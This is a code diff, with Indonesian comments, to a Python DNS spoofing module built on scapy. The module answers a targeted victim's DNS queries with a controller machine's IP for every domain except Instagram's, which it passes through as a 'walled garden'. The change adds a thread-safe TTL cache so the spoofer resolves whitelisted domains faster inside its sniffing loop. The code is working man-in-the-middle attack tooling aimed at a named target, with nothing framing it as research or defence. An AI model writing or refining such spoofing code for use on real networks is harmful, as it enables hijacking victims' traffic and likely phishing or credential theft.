@@ -10,7 +10,7 @@ seluruh domain selain Instagram ke alamat IP Komputer Pengawas (Controller).
 import socket
 import threading
 import time
-from typing import Set, Optional
+from typing import Set, Optional, Dict, Tuple
 from scapy.all import Ether, IP, TCP, UDP, ARP, DNS, DNSQR, DNSRR, sendp, conf
 from ...utils.logger import logger
 
@@ -23,6 +23,31 @@ INSTAGRAM_DOMAINS = (
     "fbcdn.net",
     "fbsbx.com"
 )
+
+# In-memory DNS cache untuk domain whitelist agar tidak memicu blocking socket I/O berulang pada sniffing loop
+_DNS_RESOLVE_CACHE: Dict[str, Tuple[str, float]] = {}
+_DNS_RESOLVE_CACHE_LOCK = threading.Lock()
+
+def resolve_cached_domain(qname: str, ttl: float = 300.0) -> Optional[str]:
+    """Resolve domain name with thread-safe TTL in-memory caching."""
+    now = time.time()
+    with _DNS_RESOLVE_CACHE_LOCK:
+        entry = _DNS_RESOLVE_CACHE.get(qname)
+        if entry:
+            ip, expire_at = entry
+            if now < expire_at:
+                return ip
+            else:
+                _DNS_RESOLVE_CACHE.pop(qname, None)
+
+    try:
+        real_ip = socket.gethostbyname(qname)
+        with _DNS_RESOLVE_CACHE_LOCK:
+            _DNS_RESOLVE_CACHE[qname] = (real_ip, now + ttl)
+        return real_ip
+    except Exception as e:
+        logger.debug(f"DNS resolve failed for {qname}: {e}")
+        return None
 
 class DNSSpoofer:
     def __init__(self, target_ip: str, target_mac: str, controller_ip: str, interface, self_mac: str, gateway_ip: str = ""):
@@ -97,11 +122,11 @@ class DNSSpoofer:
 
             # Walled Garden: Jika domain adalah Instagram, selesaikan ke IP asli agar korban BISA buka Instagram
             if self.is_whitelisted(qname):
-                try:
-                    real_ip = socket.gethostbyname(qname)
+                real_ip = resolve_cached_domain(qname, ttl=300.0)
+                if real_ip:
                     an_record = DNSRR(rrname=dns[DNSQR].qname, type="A", rclass="IN", ttl=60, rdata=real_ip)
                     logger.info(f"🌐 [DNS Spoofer] Walled Garden passthrough {qname} -> {real_ip} untuk {self.target_ip}")
-                except Exception:
+                else:
                     an_record = None
             elif qtype == 1:
                 # Query IPv4 (A record): Arahkan ke Controller IP
